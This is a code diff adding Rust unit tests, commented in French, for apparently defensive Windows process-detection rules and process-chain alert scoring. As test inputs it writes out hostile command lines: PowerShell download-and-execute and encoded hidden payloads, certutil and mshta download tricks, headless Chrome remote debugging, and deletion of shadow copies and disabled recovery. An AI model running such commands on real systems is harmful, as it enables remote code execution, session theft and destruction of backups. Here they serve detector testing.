@@ -409,3 +409,148 @@ fn per_001_nettoyage_onedrive() {
     run.categorie = "Run (u)".into();
     assert!(crate::persistance::evaluer(&run).contains("lancé via cmd"));
 }
+
+// ------------------------------------------------------------ PRC : processus (PR 3.7)
+// Décision pure de processus::alerte_processus, sur des processus synthétiques (création de processus de Sysmon 1 ou de
+// WMI, avec le parent et la ligne de commande). Aucune de ces règles n'est exercée en VM : voir la fiche.
+
+fn regle_processus(image: &str, ligne: Option<&str>, parent: Option<&str>) -> Option<(String, String)> {
+    let p = crate::processus::InfoProcessus::pour_test(image, ligne, parent);
+    crate::processus::alerte_processus(1234, &p).map(|a| (a.regle, a.niveau))
+}
+
+const WORD: &str = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE";
+const POWERSHELL: &str = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
+const EXPLORATEUR: &str = r"C:\Windows\explorer.exe";
+
+#[test]
+fn prc_001_positif() {
+    // Word qui lance PowerShell, même sans ligne de commande suspecte (ou sans ligne : processus déjà terminé)
+    assert_eq!(regle_processus(POWERSHELL, Some("powershell.exe -NoProfile"), Some(WORD)), regle_et_niveau("PRC-001", "Critique"));
+    assert_eq!(regle_processus(POWERSHELL, None, Some(WORD)), regle_et_niveau("PRC-001", "Critique"));
+    // Avec un motif de téléchargement en plus : la plus forte reste PRC-001
+    assert_eq!(regle_processus(POWERSHELL, Some("powershell -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')"), Some(WORD)),
+               regle_et_niveau("PRC-001", "Critique"));
+}
+
+#[test]
+fn prc_001_negatif() {
+    // PowerShell lancé par l'Explorateur ; Word qui lance un programme qui n'est pas un interpréteur
+    assert_eq!(regle_processus(POWERSHELL, Some("powershell.exe -NoProfile"), Some(EXPLORATEUR)), None);
+    assert_eq!(regle_processus(r"C:\Windows\splwow64.exe", Some("splwow64.exe 8192"), Some(WORD)), None);
+}
+
+#[test]
+fn prc_002_positif() {
+    let encode = format!("powershell.exe -NoP -W Hidden -enc {}", "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA");
+    assert_eq!(regle_processus(POWERSHELL, Some(&encode), Some(EXPLORATEUR)), regle_et_niveau("PRC-002", "Alerte"));
+    assert_eq!(regle_processus(POWERSHELL, Some("powershell -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')"), Some(EXPLORATEUR)),
+               regle_et_niveau("PRC-002", "Alerte"));
+}
+
+#[test]
+fn prc_002_negatif() {
+    // Script d'administration ordinaire ; « -enc » suivi d'un texte court (pas une charge encodée)
+    assert_eq!(regle_processus(POWERSHELL, Some(r"powershell.exe -ExecutionPolicy Bypass -File C:\scripts\inventaire.ps1"), Some(EXPLORATEUR)), None);
+    assert_eq!(regle_processus(POWERSHELL, Some("powershell.exe -enc UwB0AGEAcgB0AA=="), Some(EXPLORATEUR)), None);
+}
+
+#[test]
+fn prc_003_positif() {
+    assert_eq!(regle_processus(r"C:\Windows\System32\certutil.exe", Some("certutil.exe -urlcache -split -f http://203.0.113.5/a.exe a.exe"), Some(EXPLORATEUR)),
+               regle_et_niveau("PRC-003", "Alerte"));
+    assert_eq!(regle_processus(r"C:\Windows\System32\mshta.exe", Some("mshta.exe vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\")"), Some(EXPLORATEUR)),
+               regle_et_niveau("PRC-003", "Alerte"));
+}
+
+#[test]
+fn prc_003_negatif() {
+    // Usages ordinaires des mêmes outils
+    assert_eq!(regle_processus(r"C:\Windows\System32\certutil.exe", Some("certutil.exe -store My"), Some(EXPLORATEUR)), None);
+    assert_eq!(regle_processus(r"C:\Windows\System32\rundll32.exe", Some(r"rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL"), Some(EXPLORATEUR)), None);
+}
+
+#[test]
+fn prc_004_positif() {
+    assert_eq!(regle_processus(r"C:\Program Files\Google\Chrome\Application\chrome.exe",
+                               Some(r#""C:\Program Files\Google\Chrome\Application\chrome.exe" --remote-debugging-port=9222 --headless"#), Some(EXPLORATEUR)),
+               regle_et_niveau("PRC-004", "Alerte"));
+}
+
+#[test]
+fn prc_004_negatif() {
+    // WebView2 (composant d'applications) en débogage ; navigateur lancé normalement
+    assert_eq!(regle_processus(r"C:\Program Files (x86)\Microsoft\EdgeWebView\Application\msedgewebview2.exe",
+                               Some(r#""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\msedgewebview2.exe" --remote-debugging-port=0"#), Some(EXPLORATEUR)), None);
+    assert_eq!(regle_processus(r"C:\Program Files\Google\Chrome\Application\chrome.exe",
+                               Some(r#""C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory=Default"#), Some(EXPLORATEUR)), None);
+}
+
+#[test]
+fn prc_005_positif() {
+    assert_eq!(regle_processus(r"C:\Windows\System32\vssadmin.exe", Some("vssadmin.exe delete shadows /all /quiet"), Some(EXPLORATEUR)),
+               regle_et_niveau("PRC-005", "Critique"));
+    assert_eq!(regle_processus(r"C:\Windows\System32\bcdedit.exe", Some("bcdedit /set {default} recoveryenabled No"), Some(EXPLORATEUR)),
+               regle_et_niveau("PRC-005", "Critique"));
+    // Ancien faux négatif (fiche, avant la PR 3.7) : un motif PowerShell plus tôt dans la ligne ne masque plus la suppression
+    // des sauvegardes, qui donne la règle et le niveau
+    let p = crate::processus::InfoProcessus::pour_test(POWERSHELL,
+        Some("powershell -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a'); vssadmin delete shadows /all"), Some(EXPLORATEUR));
+    let a = crate::processus::alerte_processus(1234, &p).expect("alerte");
+    assert_eq!((a.regle.as_str(), a.niveau.as_str(), a.score), ("PRC-005", "Critique", 10));
+    assert!(a.raisons.contains("PowerShell obscurci") && a.raisons.contains("suppression des sauvegardes"), "les deux motifs : {}", a.raisons);
+}
+
+#[test]
+fn prc_005_negatif() {
+    // Lecture des clichés, sans suppression
+    assert_eq!(regle_processus(r"C:\Windows\System32\vssadmin.exe", Some("vssadmin.exe list shadows"), Some(EXPLORATEUR)), None);
+    assert_eq!(regle_processus(r"C:\Windows\System32\wbadmin.exe", Some("wbadmin get versions"), Some(EXPLORATEUR)), None);
+}
+
+// ------------------------------------------------------------ CHA : chaînes de processus (PR 3.7)
+// chaines::Arbre sur une liste de processus synthétique : explorer → cmd → powershell → certutil
+
+fn arbre_de_test() -> crate::chaines::Arbre {
+    use crate::natif::InfoListe;
+    let mut arbre = crate::chaines::Arbre::default();
+    let liste: std::collections::HashMap<u32, InfoListe> = [
+        (100, ("explorer", 4)), (200, ("cmd", 100)), (300, ("powershell", 200)), (400, ("certutil", 300)),
+        (500, ("notepad", 100)),
+    ].into_iter().map(|(pid, (nom, parent))| (pid, InfoListe { nom: nom.into(), parent })).collect();
+    arbre.maj(&liste);
+    arbre
+}
+
+#[test]
+fn cha_001_positif() {
+    // Deux signaux dans la même descendance, score cumulé au seuil (12) : une alerte Critique, une seule fois par niveau
+    let mut arbre = arbre_de_test();
+    arbre.signaler(300, 5, "PowerShell obscurci ou qui télécharge du code");
+    arbre.signaler(400, 7, "connexion vers une adresse inconnue");
+    let chaines = arbre.chaines();
+    let a = arbre.alertes(&chaines);
+    assert_eq!(a.iter().map(|a| (a.regle.as_str(), a.niveau.as_str(), a.score)).collect::<Vec<_>>(), [("CHA-001", "Critique", 12)]);
+    assert!(arbre.alertes(&chaines).is_empty(), "pas de nouvelle alerte au même score");
+    // Score plus haut : nouvelle alerte
+    arbre.signaler(200, 3, "écriture dans un dossier de démarrage");
+    let chaines = arbre.chaines();
+    assert_eq!(arbre.alertes(&chaines).len(), 1);
+}
+
+#[test]
+fn cha_001_negatif() {
+    // Un seul signal fort (14) : pas une chaîne ; deux signaux sous le seuil (11) : rien
+    let mut arbre = arbre_de_test();
+    arbre.signaler(400, 14, "connexion vers une adresse inconnue");
+    assert!(arbre.alertes(&arbre.chaines()).is_empty(), "un seul signal");
+    let mut arbre = arbre_de_test();
+    arbre.signaler(300, 5, "PowerShell obscurci ou qui télécharge du code");
+    arbre.signaler(400, 6, "connexion vers une adresse inconnue");
+    assert!(arbre.alertes(&arbre.chaines()).is_empty(), "sous le seuil");
+    // Deux signaux dans deux descendances distinctes de l'Explorateur (racine) : deux chaînes, aucune au seuil
+    let mut arbre = arbre_de_test();
+    arbre.signaler(400, 7, "connexion vers une adresse inconnue");
+    arbre.signaler(500, 7, "connexion vers une adresse inconnue");
+    assert!(arbre.alertes(&arbre.chaines()).is_empty(), "racines distinctes");
+}
